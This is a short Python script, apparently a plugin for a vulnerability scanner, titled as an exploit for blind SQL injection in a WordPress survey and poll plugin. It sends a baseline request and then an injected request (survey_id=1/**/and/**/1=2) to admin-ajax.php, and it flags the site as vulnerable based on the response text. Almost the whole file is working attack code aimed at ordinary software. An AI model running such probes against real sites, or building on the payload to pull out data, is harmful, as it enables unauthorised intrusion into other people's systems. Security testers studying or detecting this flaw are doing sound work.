#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'K0thony'
# Exploit Title : Wordpress Survey and poll Blind SQL Injection
def assign(service,arg):
	if service == 'wordpress':
		return True,arg
def audit(arg):
	payload = "\"wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save&survey_id=1\""
	payload1 = "\"wp-admin/admin-ajax.php?action=ajax_survey&sspcmd=save&survey_id=1/**/and/**/1=2\""
	verify_url = arg + payload
	code, head, res, errcode, _ = curl.curl(verify_url)
	#先访问survey_id=1此时survey_id就存在了
	if code!=200:
		return
	verify_url = arg + payload1
	code, head, res, errcode, _ = curl.curl(verify_url)
	#再次访问survey_id=1/**/and/**/1=2
	#存在返回updated，不存在返回success
	if code==200 and 'success' in res:
		security_hole(verify_url)
if __name__ == '__main__':
	from dummy import *
	audit(assign('wordpress', 'http://127.0.0.1/wordpress/')[1])
